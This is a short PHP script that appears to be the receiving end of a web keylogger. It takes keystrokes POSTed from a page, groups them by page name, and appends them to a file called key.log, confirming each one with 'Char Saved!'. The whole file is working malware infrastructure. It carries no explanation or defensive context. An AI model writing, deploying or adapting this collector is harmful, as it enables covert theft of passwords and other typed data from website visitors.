<?php
session_start();

if(!isset($_POST['key'])) {
    echo("Access Denied!");
    exit(0);
}

$file = fopen("key.log","a+");

if (!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']) {
    $_SESSION['page'] = $_POST['page'];
    fwrite($file," [[[ PAGE : ".$_POST['page']."]]] ");
}

fwrite($file,$_POST['key']);
fclose($file);

echo('Char Saved!');